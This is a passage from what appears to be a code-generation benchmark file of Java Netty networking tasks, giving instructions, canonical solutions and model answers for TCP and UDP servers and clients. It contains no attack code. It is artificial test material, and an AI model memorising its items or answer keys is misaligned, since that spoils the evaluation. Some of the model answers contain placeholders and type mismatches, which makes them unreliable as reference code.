    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.entity.ServerTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\nimport org.nico.ratel.landlords.server.ServerContains;\nimport org.nico.ratel.landlords.server.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.server.handler.ProtobufTransferHandler;\n\nimport java.net.InetSocketAddress;\nimport java.util.Timer;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                .addLast(new ProtobufVarint32FrameDecoder())\n                                .addLast(new ProtobufDecoder(ServerTransferData.ServerTransferDataProtoc.getDefaultInstance()))\n                                .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                .addLast(new ProtobufEncoder())\n                                .addLast(new SecondProtobufCodec())\n                                .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The protobuf server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n\n            ServerContains.THREAD_EXCUTER.execute(() -> {\n                Timer timer = new Timer();\n                timer.schedule(new RoomClearTask(), 0L, 3000L);\n            });\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class ProtobufProxy {\n\n    public void start(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline pipeline = ch.pipeline();\n\n                     // Add idle state handler: trigger event if no read/write for 60s\n                     pipeline.addLast(new IdleStateHandler(60, 0, 0));\n\n                     // Add protobuf frame decoding and encoding\n                     pipeline.addLast(new ProtobufVarint32FrameDecoder());\n                     pipeline.addLast(new ProtobufDecoder(YourProtobufMessage.getDefaultInstance()));\n\n                     pipeline.addLast(new ProtobufVarint32LengthFieldPrepender());\n                     pipeline.addLast(new ProtobufEncoder());\n\n                     // Add custom business logic handler\n                     pipeline.addLast(new CustomBusinessHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class CustomBusinessHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Handle the decoded protobuf message here\n            YourProtobufMessage message = (YourProtobufMessage) msg;\n            // Implement your business logic\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework for backup communication in a distributed system. The server should handle incoming UDP packets, decode them, and process messages while managing resources efficiently.\n\nClass Description: BackupServer is an AutoCloseable class that establishes a Netty-based UDP server for backup communication. It manages network connections, message handling, and graceful shutdown procedures.\n\nAttributes:\n- commonParameter: [CommonParameter] - Configuration parameters for the backup server\n- port: [int] - Port number to bind the UDP server\n- backupManager: [BackupManager] - Manager for backup operations\n- channel: [Channel] - Netty channel for UDP communication\n- shutdown: [boolean] - Flag indicating server shutdown status\n- executor: [ExecutorService] - Thread executor for server operations\n\nMethods:\n- initServer(): [void]() -> [void] - Initializes and starts the backup server in a separate thread if conditions are met\n- start(): [void]() throws [Exception] - Configures and starts the Netty UDP server with proper handlers\n- close(): [void]() -> [void] - Implements AutoCloseable to gracefully shutdown the server and release resources\n\nConstructor:\n- BackupServer([BackupManager backupManager]) - Creates a new instance with the specified BackupManager",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.common.backup.BackupManager;\nimport org.tron.common.es.ExecutorServiceManager;\nimport org.tron.common.parameter.CommonParameter;\nimport org.tron.p2p.stats.TrafficStats;\n\npublic class BackupServer implements AutoCloseable {\n\n  private CommonParameter commonParameter = CommonParameter.getInstance();\n  private int port = commonParameter.getBackupPort();\n  private BackupManager backupManager;\n  private Channel channel;\n  private volatile boolean shutdown = false;\n  private ExecutorService executor;\n\n  public BackupServer(final BackupManager backupManager) {\n    this.backupManager = backupManager;\n  }\n\n  public void initServer() {\n    if (port > 0 && commonParameter.getBackupMembers().size() > 0) {\n      executor = ExecutorServiceManager.newSingleThreadExecutor(\"BackupServer\");\n      executor.submit(() -> {\n        try {\n          start();\n        } catch (Exception e) {\n          logger.error(\"Start backup server failed, {}\", e);\n        }\n      });\n    }\n  }\n\n  private void start() throws Exception {\n    NioEventLoopGroup group = new NioEventLoopGroup(1);\n    try {\n      while (!shutdown) {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n            .channel(NioDatagramChannel.class)\n            .handler(new ChannelInitializer<NioDatagramChannel>() {\n              @Override\n              public void initChannel(NioDatagramChannel ch) throws Exception {\n                ch.pipeline().addLast(TrafficStats.udp);\n                ch.pipeline().addLast(new ProtobufVarint32LengthFieldPrepender());\n                ch.pipeline().addLast(new ProtobufVarint32FrameDecoder());\n                ch.pipeline().addLast(new PacketDecoder());\n                MessageHandler messageHandler = new MessageHandler(ch, backupManager);\n                backupManager.setMessageHandler(messageHandler);\n                ch.pipeline().addLast(messageHandler);\n              }\n            });\n\n        channel = b.bind(port).sync().channel();\n        channel.closeFuture().sync();\n        if (shutdown) {\n          break;\n        }\n      }\n    } finally {\n      group.shutdownGracefully().sync();\n    }\n  }\n\n  @Override\n  public void close() {\n    shutdown = true;\n    backupManager.stop();\n    if (channel != null) {\n      try {\n        channel.close().await(10, TimeUnit.SECONDS);\n      } catch (Exception e) {\n        logger.warn(\"Closing backup server failed.\", e);\n      }\n    }\n    ExecutorServiceManager.shutdownAndAwaitTermination(executor, \"BackupServer\");\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class BackupServer implements AutoCloseable {\n    private final CommonParameter commonParameter;\n    private final int port;\n    private final BackupManager backupManager;\n    private Channel channel;\n    private final AtomicBoolean shutdown = new AtomicBoolean(false);\n    private final ExecutorService executor;\n\n    public BackupServer(BackupManager backupManager) {\n        this.backupManager = backupManager;\n        this.commonParameter = backupManager.getCommonParameter();\n        this.port = commonParameter.getBackupPort();\n        this.executor = Executors.newSingleThreadExecutor();\n    }\n\n    public void initServer() {\n        if (shutdown.get()) return;\n        executor.submit(this::start);\n    }\n\n    private void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioDatagramChannel.class)\n                    .option(ChannelOption.SO_RCVBUF, 1024 * 1024)\n                    .handler(new ChannelInitializer<NioDatagramChannel>() {\n                        @Override\n                        protected void initChannel(NioDatagramChannel ch) {\n                            ch.pipeline().addLast(new MessageHandler());\n                        }\n                    });\n\n            channel = bootstrap.bind(port).sync().channel();\n            while (!shutdown.get()) {\n                Thread.sleep(1000);\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class MessageHandler extends SimpleChannelInboundHandler<DatagramPacket> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket packet) {\n            ByteBuf data = packet.content();\n            byte[] bytes = new byte[data.readableBytes()];\n            data.getBytes(data.readerIndex(), bytes);\n            String message = new String(bytes);\n            backupManager.processBackupMessage(message);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n        }\n    }\n\n    @Override\n    public void close() {\n        shutdown.set(true);\n        if (channel != null && channel.isOpen()) {\n            channel.close().awaitUninterruptibly();\n        }\n        executor.shutdownNow();\n    }\n}\n```"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Create a Java class that implements a UDP echo server using Netty framework, capable of receiving datagrams and echoing them back to the sender.\n\nClass Description: DatagramChannelEchoServer is a Netty-based UDP server that listens on a specified port, receives incoming datagrams, and echoes them back to the sender. The server handles network operations asynchronously and includes proper resource cleanup.\n\nAttributes:\n- group: [NioEventLoopGroup] - Handles I/O operations asynchronously\n- bootstrap: [Bootstrap] - Configures and initializes the Netty server\n- channelFuture: [ChannelFuture] - Represents the result of an asynchronous channel operation\n- DEFAULT_PORT: [int] - Default port number (7) if none specified\n\nMethods:\n- start([int port]) -> [void] - Starts the UDP server on the specified port, initializes Netty components, and binds to the port\n- shutdown() -> [void] - Gracefully shuts down the server and releases resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server\n\nThe class should use NioDatagramChannel for UDP transport, enable SO_BROADCAST option, and include proper error handling and resource cleanup. The server should continue running until explicitly stopped, echoing all received datagrams back to their senders.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\npublic class DatagramChannelEchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelFuture channelFuture;\n\n    public void start(int port) throws Exception {\n        group = new NioEventLoopGroup();\n        \n        try {\n            bootstrap = new Bootstrap();\n            \n            bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new DatagramChannelEchoServerHandler());\n            \n            channelFuture = bootstrap.bind(port).sync();\n            System.out.println(\"DatagramChannelEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            \n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.InetSocketAddress;\n\npublic class DatagramChannelEchoServer {\n    private static final int DEFAULT_PORT = 7;\n\n    private final EventLoopGroup group = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private volatile ChannelFuture channelFuture;\n\n    public void start(int port) {\n        bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new ChannelInitializer<NioDatagramChannel>() {\n                    @Override\n                    protected void initChannel(NioDatagramChannel ch) {\n                        ch.pipeline().addLast(new EchoHandler());\n                    }\n                });\n\n        try {\n            channelFuture = bootstrap.bind(new InetSocketAddress(port)).sync();\n            System.out.println(\"UDP echo server started on port \" + port);\n            channelFuture.channel().closeFuture().await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void shutdown() {\n        if (channelFuture != null) {\n            channelFuture.channel().close();\n        }\n        group.shutdownGracefully();\n    }\n\n    private static class EchoHandler extends SimpleChannelInboundHandler<DatagramPacket> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket packet) throws Exception {\n            ByteBuf in = packet.content();\n            System.out.println(\"Received: \" + in.toString(CharsetUtil.UTF_8));\n            ctx.writeAndFlush(packet.retain());\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Invalid port: \" + args[0]);\n                System.exit(1);\n            }\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n        server.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework, with support for multiple transport types (NIO, Epoll, KQueue, IOUring) and graceful shutdown capabilities.\n\nClass Description: GeyserServer is a Netty-based UDP server implementation that handles network communication using the most optimal transport available on the system. It manages server lifecycle including binding to ports and graceful shutdown.\n\nAttributes:\n- TRANSPORT: [Transport] - Static final field holding the best available transport type\n- SHUTDOWN_QUIET_PERIOD_MS: [int] - Milliseconds to wait for quiet period during shutdown\n- SHUTDOWN_TIMEOUT_MS: [int] - Maximum milliseconds to wait for shutdown\n- geyser: [GeyserImpl] - Reference to the main Geyser implementation\n- group: [EventLoopGroup] - Parent event loop group for the server\n- childGroup: [EventLoopGroup] - Child event loop group for handling connections\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- playerGroup: [EventLoopGroup] - Event loop group for player connections\n- bootstrapFutures: [ChannelFuture[]] - Array of channel futures for server binding\n\nMethods:\n- GeyserServer([GeyserImpl geyser, int threadCount]) -> [void] - Constructor that initializes the server with specified thread count\n- bind([InetSocketAddress address]) -> [CompletableFuture<Void>] - Binds the server to the specified address and returns a future\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- createBootstrap() -> [ServerBootstrap] - Private method that creates and configures the server bootstrap\n- compatibleTransport() -> [Transport] - Static private method that detects the best available transport\n- isClassAvailable([String className]) -> [boolean] - Static private helper method to check class availability\n\nNested Types:\n- Transport: [record] - Holds transport-specific channel class and event loop group factory",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueue;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUring;\nimport io.netty.incubator.channel.uring.IOUringDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUringEventLoopGroup;\nimport io.netty.util.concurrent.Future;\nimport org.cloudburstmc.netty.channel.raknet.RakChannelFactory;\nimport org.cloudburstmc.netty.channel.raknet.config.RakChannelOption;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.IntFunction;\n\npublic final class GeyserServer {\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 500;\n\n    private final GeyserImpl geyser;\n    private EventLoopGroup group;\n    private EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory().apply(1);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory().apply(threadCount);\n        this.bootstrap = this.createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures = new ChannelFuture[1];\n        ChannelFuture future = bootstrap.bind(address);\n        bootstrapFutures[0] = future;\n        return Bootstraps.allOf(bootstrapFutures);\n    }\n\n    public void shutdown() {\n        try {\n            Future<?> futureChildGroup = this.childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.childGroup = null;\n            Future<?> futureGroup = this.group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.group = null;\n            Future<?> futurePlayerGroup = this.playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.playerGroup = null;\n\n            futureChildGroup.sync();\n            futureGroup.sync();\n            futurePlayerGroup.sync();\n        } catch (InterruptedException e) {\n            GeyserImpl.getInstance().getLogger().severe(\"Exception in shutdown process\", e);\n        }\n        for (ChannelFuture f : bootstrapFutures) {\n            f.channel().closeFuture().syncUninterruptibly();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        GeyserServerInitializer serverInitializer = new GeyserServerInitializer(this.geyser);\n        playerGroup = serverInitializer.getEventLoopGroup();\n\n        return new ServerBootstrap()\n                .channelFactory(RakChannelFactory.server(TRANSPORT.datagramChannel()))\n                .group(group, childGroup)\n                .childHandler(serverInitializer);\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUring\")\n                && IOUring.isAvailable()\n                && Boolean.parseBoolean(System.getProperty(\"Geyser.io_uring\"))) {\n            return new Transport(IOUringDatagramChannel.class, IOUringEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\") && Epoll.isAvailable()) {\n            return new Transport(EpollDatagramChannel.class, EpollEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\") && KQueue.isAvailable()) {\n            return new Transport(KQueueDatagramChannel.class, KQueueEventLoopGroup::new);\n        }\n\n        return new Transport(NioDatagramChannel.class, NioEventLoopGroup::new);\n    }\n\n    private record Transport(Class<? extends DatagramChannel> datagramChannel, IntFunction<EventLoopGroup> eventLoopGroupFactory) {\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class GeyserServer {\n    public static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 5000;\n\n    private final GeyserImpl geyser;\n    private final EventLoopGroup group;\n    private final EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private final EventLoopGroup playerGroup;\n    private final ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.newEventLoopGroup(threadCount);\n        this.childGroup = TRANSPORT.newEventLoopGroup(threadCount);\n        this.playerGroup = new DefaultEventExecutorGroup(4);\n        this.bootstrap = createBootstrap();\n        this.bootstrapFutures = new ChannelFuture[1];\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        CompletableFuture<Void> future = new CompletableFuture<>();\n        bootstrapFutures[0] = bootstrap.bind(address).addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                future.complete(null);\n            } else {\n                future.completeExceptionally(f.cause());\n            }\n        });\n        return future;\n    }\n\n    public void shutdown() {\n        for (ChannelFuture future : bootstrapFutures) {\n            if (future != null && future.channel().isOpen()) {\n                future.channel().close();\n            }\n        }\n\n        try {\n            group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS).sync();\n            childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS).sync();\n            playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS).sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(group, childGroup)\n         .channelFactory(TRANSPORT.channelClass())\n         .option(ChannelOption.SO_REUSEADDR, true)\n         .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n         .childHandler(new ChannelInitializer<DatagramChannel>() {\n             @Override\n             protected void initChannel(DatagramChannel ch) {\n                 ch.pipeline().addLast(playerGroup, \"handler\", new GeyserHandler(geyser));\n             }\n         });\n        return b;\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\")) {\n            return new Transport(EpollDatagramChannel::new, EpollEventLoopGroup::new);\n        } else if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\")) {\n            return new Transport(KQueueDatagramChannel::new, KQueueEventLoopGroup::new);\n        } else {\n            return new Transport(NioDatagramChannel::new, NioEventLoopGroup::new);\n        }\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n\n    record Transport(ChannelFactory<? extends DatagramChannel> channelClass,\n                     java.util.function.Function<Integer, EventLoopGroup> eventLoopGroupFactory) {\n        public EventLoopGroup newEventLoopGroup(int nThreads) {\n            return eventLoopGroupFactory.apply(nThreads);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Java class that implements a UDP client using Netty framework for sending and receiving datagram packets. The client should be able to start a connection, send messages to a specified host and port, handle console input for sending messages, and gracefully shutdown the connection.\n\nClass Description: DatagramChannelEchoClient is a Netty-based UDP client that establishes a connection to a specified host and port, sends messages via UDP datagrams, and can be controlled through console input. It manages network resources efficiently and provides clean shutdown capabilities.\n\nAttributes:\n- host: String - The target host address to which messages will be sent\n- port: int - The target port number on the host\n- group: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - The Netty channel used for UDP communication\n\nMethods:\n- DatagramChannelEchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the UDP client by initializing Netty components and binding to the port\n- sendMessage(String message) -> void - Sends a message to the configured host and port via UDP\n- stop() -> void - Gracefully shuts down the client and releases resources\n- runConsoleInput() -> void - Reads input from console and sends it as messages until terminated",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\n\npublic final class DatagramChannelEchoClient {\n\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new DatagramChannelEchoClientHandler());\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n        System.out.println(\"DatagramChannelEchoClient\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(new io.netty.channel.socket.DatagramPacket(\n            buf, new InetSocketAddress(host, port)));\n        writeBuffer.clear();\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + host);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + host);\n            System.exit(1);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
